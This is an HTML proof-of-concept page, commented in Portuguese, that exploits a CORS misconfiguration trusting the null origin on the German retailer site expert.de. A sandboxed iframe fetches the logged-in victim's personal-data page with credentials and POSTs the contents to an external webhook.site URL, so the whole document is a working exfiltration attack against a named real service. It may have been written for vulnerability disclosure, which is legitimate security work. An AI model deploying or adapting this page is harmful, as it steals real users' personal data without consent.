<!DOCTYPE html>
<html>
<body>
<!--
  CORS PoC - expert.de trust_null
  Vetor: iframe sandbox gera Origin: null automaticamente
  Vítima acessa essa página logada no expert.de
  Dados pessoais são exfiltrados para o atacante
-->
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://www.expert.de/shop/mein-expert/persoenliche-daten', {
  credentials: 'include'
})
.then(r => r.text())
.then(data => {
  // Em ataque real: enviar para servidor do atacante
  fetch('https://webhook.site/d30b963b-617d-4e0b-9bbe-ac2f16c13573', {
    method: 'POST',
    body: data
  });
  // Para PoC: mostrar na tela
  parent.postMessage('STATUS: Dados capturados. Tamanho: ' + data.length + ' bytes', '*');
})
.catch(e => parent.postMessage('Erro: ' + e, '*'));
</script>
"></iframe>

<script>
window.addEventListener('message', function(e) {
  document.write('<h2>Resultado:</h2><pre>' + e.data + '</pre>');
});
</script>
</body>
</html>
